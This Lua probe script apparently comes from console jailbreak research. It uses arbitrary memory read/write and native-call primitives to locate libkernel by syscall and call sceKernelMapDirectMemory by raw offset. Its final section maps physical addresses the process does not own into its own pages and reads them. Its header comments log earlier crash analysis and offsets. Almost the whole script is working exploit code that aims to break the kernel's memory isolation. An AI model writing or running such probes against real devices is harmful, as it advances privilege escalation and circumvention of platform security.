-- CRASH_CLASS: MODERATE
-- PROBE 1523c: MapDirectMemory with a caller-chosen address, so it cannot clobber the Lua heap
--
-- -- prior art:
--   probes/phase36_realargs/1522b_mapdm_fcall_offsets.lua
--     results/phase36_realargs/1522b_mapdm_fcall_offsets_20261109_234027.txt
--   probes/phase36_realargs/1523a_mapdm_prot_matrix.lua
--     results/phase36_realargs/1523a_mapdm_prot_matrix_20261109_234855.txt
--   probes/phase36_realargs/1523b_mapdm_fault_attribution.lua
--     results/phase36_realargs/1523b_mapdm_fault_attribution_20261109_235053.txt
--     -> libkernel+0x15020 is sceKernelMapDirectMemory by behaviour: a zero-length request
--        returns Sony status 0x80020016 and the process survives. ANY request with a real
--        length takes SIGSEGV 0x0b -- with the payload's own prot 0x33 / flags 0x400000 pair,
--        with a bare prot 3 / flags 0, and with prot 0 / flags 0 / phys 0. Physical address and
--        protection are both irrelevant; the LENGTH is the only variable that matters.
--     All three fault records share a shape: err=0x4 (not present, read, user), cs=0x43, and
--     the faulting address is inside the heap region (0x3107705c0, 0x3110cc370) while the
--     registers are mid-Lua (1523b: rip=eboot+0x1AE841, rsp on the main stack).
--     Reading 1523b's own bytes at eboot+0x1BA4C0 (the 1523a fault RIP) identified a Lua string
--     hash loop: 45 0F B6 44 17 FF = movzx r8d, byte [r15+rdx-1].
--     That combination -- a length-0 call is fine, any real length faults inside the Lua heap --
--     reads as the map SUCCEEDING and its vm_map entry landing on live Lua heap, exactly the
--     MAP_FIXED-shaped replace that sys 548 op 3 and the mmap_dmem path are known to perform.
--   .local/loader_payload/gpu.lua:344 alloc_main_dmem -- the payload zeroes *out before the call,
--     i.e. it lets the kernel choose the address and never checks what it chose.
--
-- This probe pre-fills *out with an address we already own, so if the mapper honours the value
-- as a destination it cannot land anywhere else. [B] maps our OWNED physical block into our OWN
-- anonymous page; [C] would then ask the real question (a physical address we do not own) at a
-- second page we own. If [B] still faults, the mapper ignores the hint and this route is dead.

print("=== PROBE 1523c: MAPDIRECTMEMORY AT A CALLER-CHOSEN ADDRESS ===")
print("")

local function N(v)
    if type(v) == "number" then return v end
    if type(v) == "table" and v.tonumber then
        local ok, n = pcall(function() return v:tonumber() end)
        if ok and n then return n end
    end
    local ok, n = pcall(function() return tonumber(v) end)
    if ok and n then return n end
    return 0
end
local function addr_of(u)
    local n = N(u)
    if n >= 0x10000 and n < 0x8000000000 then return n end
    return nil
end
local function mk(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) % 4294967296 end
    return nil
end
local function wd(a, v)
    return pcall(function() memory.write_dword(a, uint64(v)) end)
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return N(v) end
    return nil
end
local function wq(a, v)
    return pcall(function() memory.write_qword(a, uint64(v)) end)
end
local function fmt(v)
    if v == nil then return "nil" end
    local n = N(v)
    if n < 0 then n = n + 2 ^ 64 end
    return string.format("0x%X", n)
end
local function sid(v)
    local n = N(v)
    if n < 0 then n = n + 2 ^ 64 end
    return n
end
local function self_pid()
    local ok, v = pcall(function() return getpid() end)
    if ok then return N(v) end
    return -1
end

local PID0 = self_pid()
print("pid=" .. tostring(PID0))

local function call6(fn, rdi, rsi, rdx, rcx, r8, r9)
    local ok, rv = pcall(function()
        return native.fcall_with_rax(uint64(fn), uint64(0), uint64(rdi), uint64(rsi),
                                     uint64(rdx), uint64(rcx), uint64(r8), uint64(r9))
    end)
    if not ok then return nil end
    return N(rv)
end

-- ============================================================
-- [A] libkernel base + identity control
-- ============================================================
print("")
print("[A] libkernel base")
local lk = nil
do
    local ib = memory.alloc(0x200)
    local iba = addr_of(ib)
    if iba then
        wd(iba, 0x160)
        local ok, rv = pcall(function() return mk(593)(uint64(0x2001), uint64(iba)) end)
        if ok and N(rv) == 0 then
            local lo = (rd(iba + 0x108) or 0) % 4294967296
            local hi = (rd(iba + 0x10C) or 0) % 4294967296
            if lo ~= 0 or hi ~= 0 then lk = hi * 4294967296 + lo end
        end
    end
end
print("  libkernel = " .. fmt(lk))
if not lk then print("VERDICT: no libkernel base"); return end
local alloc_fn = lk + 0x17EF0
local map_fn   = lk + 0x15020

local vo = memory.alloc(8)
local voaddr = addr_of(vo)
if not voaddr then print("  FAIL: out buffer"); return end

memory.write_qword(vo, uint64(0))
local rv0 = call6(map_fn, voaddr, 0, 3, 0, 0, 0)
print("  identity len=0 -> rv=" .. tostring(rv0) .. " (0x" .. string.format("%X", sid(rv0 or 0)) .. ")")
if rv0 == nil then
    print("VERDICT: the identity call no longer returns; nothing to test")
    return
end

-- ============================================================
-- [B] allocate, then map into a page we already own
-- ============================================================
print("")
print("[B] allocate an owned direct-memory block")
local pout = memory.alloc(8)
local pouta = addr_of(pout)
if not pouta then print("  FAIL"); return end
memory.write_qword(pout, uint64(0))
local rvA = call6(alloc_fn, 0, 0x150000000, 0x4000, 0x4000, 0, pouta)
local phys = rq(pouta)
print("  AllocateDirectMemory rv=" .. tostring(rvA) .. " phys=" .. fmt(phys))
if rvA ~= 0 or not phys or phys < 0x1000 then
    print("VERDICT: no owned block")
    return
end

-- our own destination page
local dest = mk(477)(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002),
                     uint64(0xFFFFFFFF), uint64(0))
local desta = addr_of(dest)
print("  owned destination page = " .. fmt(desta))
if not desta then
    print("VERDICT: no destination page")
    return
end
wd(desta, 0xAABBCCDD)
print("  marker written, readback = " .. string.format("%08X", rd(desta) or 0))

print("")
print("[B2] map_fn(out pre-filled with " .. fmt(desta) .. ", 0x4000, prot 3, flags 0, phys " ..
      fmt(phys) .. ", align 0x4000)")
memory.write_qword(vo, uint64(desta))
local rvB = call6(map_fn, voaddr, 0x4000, 3, 0, phys, 0x4000)
if rvB == nil then
    print("  *** fcall did not return even with a caller-chosen address ***")
    print("VERDICT: the mapper ignores the destination hint; this route is dead.")
    return
end
local gotva = rq(voaddr)
print("  rv=" .. tostring(rvB) .. " (0x" .. string.format("%X", sid(rvB)) .. ") out=" .. fmt(gotva))

print("")
print("  destination page after the call: " .. string.format("%08X", rd(desta) or 0) ..
      "   (0xAABBCCDD means untouched)")
if gotva and gotva ~= desta then
    print("  the mapper returned a DIFFERENT address " .. fmt(gotva) .. " -- the hint was ignored")
end

-- ============================================================
-- [C] only if [B2] succeeded: a physical address we do not own
-- ============================================================
print("")
print("[C] physical addresses outside our allocation, mapped at our own pages (READ ONLY)")
local targets = { 0x0, 0x1000, 0x100000, 0x110000000 }
for i, pa in ipairs(targets) do
    if pa == phys then
        print("  [C" .. i .. "] " .. fmt(pa) .. " skipped (ours)")
    else
        local d = mk(477)(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002),
                          uint64(0xFFFFFFFF), uint64(0))
        local da = addr_of(d)
        if not da then
            print("  [C" .. i .. "] no page, stopping")
            break
        end
        wd(da, 0x5A5A5A5A)
        memory.write_qword(vo, uint64(da))
        print("  [C" .. i .. "] phys=" .. fmt(pa) .. "  dest=" .. fmt(da) .. "  -> calling")
        local rv = call6(map_fn, voaddr, 0x4000, 3, 0, pa, 0x4000)
        if rv == nil then
            print("      *** fcall did not return ***")
            break
        end
        print("      rv=" .. tostring(rv) .. " (0x" .. string.format("%X", sid(rv)) .. ") out=" .. fmt(rq(voaddr)))
        local line = "      page now: "
        local okall = true
        for k = 0, 5 do
            local v = rd(da + k * 4)
            if not v then okall = false break end
            line = line .. string.format("%08X ", v)
        end
        print(line .. (okall and "" or "(read faulted)"))
        if rd(da) ~= 0x5A5A5A5A then
            print("      *** the page CHANGED -- physical " .. fmt(pa) .. " replaced our content ***")
        end
    end
end

print("")
print("pid_after=" .. tostring(self_pid()) .. " (was " .. tostring(PID0) .. ")")
print("")
print("=== PROBE 1523c COMPLETE ===")
